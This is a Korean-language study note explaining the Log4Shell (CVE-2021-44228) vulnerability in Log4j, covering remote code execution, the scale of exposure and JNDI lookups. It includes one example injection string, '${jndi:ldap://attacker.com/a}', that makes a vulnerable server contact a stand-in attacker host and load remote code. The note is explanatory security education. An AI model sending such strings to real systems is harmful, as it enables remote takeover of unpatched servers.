# Log4J & Loh4Shell보안 취약점

https://lead-earthquake-61f.notion.site/CVE-2021-44228-Log4J-a8ce8189a0da48c68e2645dcd949ceb1

https://www.youtube.com/@nomadcoders

애플, 구글, 깃허브, 아마존, 텐선트 등 많은 기업들이 노출되어 있고 캐나다는 4000개의 달하는 국방사이트를 임시 폐쇄했다.

CVSS 취약점 등급에서 10/10 만점을 받았다.

Log4Shell 은 제로데이 RCE 취약점이다.

제로데이란 아직 발견되지 않은 취약점으로 해커만이 취약점을 알고 있는 상황이다. 말 그대로 보완관계자는 이를 해결하기 위해 '제로데이' 해결할 시간이 하루도 안된는 것이다.

알리바바 보안팀에 의해 발견되었는데 최초 발생은 2021.12.01, 발견 시각은 2021.12.09 즉 9일동안 해킹을 당했다는 거다.

![](../img/Log4J%20-%201.webp)

RCE란 Remote Code Execution의 줄임말로 원격 코드 실행을 말한다. 원격으로 내 컴퓨터에서 상대의 컴퓨터를 조작할 수 있는 것을 말한다. 나아가 관리자 권한으로 최상위층 권한으로 조작가능하다.

데이터 정보를 탈취, 수정, 삭제 뿐만아니라 데이터를 잠글 수도 있고 매우매우 크리티컬한 취약점이다.

Log4j 취약점은 또한 범위가 광범위하다. 애플, 테슬라, 구글 같은 대기업에서 모두 취약하다.

그 이유는 Log4j 때문인데 Java에서 매우 자주 쓰이느 패키지다. 근데 Java는 매우 대중적인 언어이므로 범위가 광범위하다는 것이다. 2015 오라클에 따르면 130억개의 기기에서 사용중이라고 발표했다.

즉, 자주 쓰이는 언어 + 자주 쓰이는 패키지 = 크리티컬한 취약점 게다가 원격으로

Log4j 는 회사에서 발생하는 모든 기록을 저장하는 단순한 패키지이다. 기록이라 함은 로그인, 댓글, 업로드 등등 모든 기록을 말한다. 여기서 주의할 것은 단순히 댓글은 신뢰할수 없는 사용자로 인지하고 코드로도 인지하지 않는다. 즉, 신뢰할수 없는 사용자는 접근이 불가능한 것이다.

Log4j 에는 Lookups 라는 기능이 있는데 사용자를 살짝 신뢰한다. 여기서 문제가 발생한 것이다. JNDI가 lookups의 기능이다.

```
${jndi:ldap://attacker.com/a}
```


위와 같은 입력을 보내면 Log4j는 log로 넣고 동시에 해당url을 불러온다. 그 url이 공격자 url 일수도 있는거다. 그 url 뿐만아니라 호스팅 되어있는 코드가 해당 서버에서 실행 될수도 있다.

예시

마인크래프트는 채팅내용을 Log4j로 기록하고 있는데 채팅에 코드를 입력하면 공격이 실행된다.

애플은 ipone에 이름을 기록하는데 이를 코드로 url을 요청하면 벡엔드가 문제를 url 요청했다. 즉, 벡엔드를 조정할 수 있게되는 것

만약 이 코드에 엄청나게 위험한 코드가 들어 있었다면 그건 난리난리가 나는거다.

이처럼 꽤 최근에 벌어진 큰 보안 이슈 였다.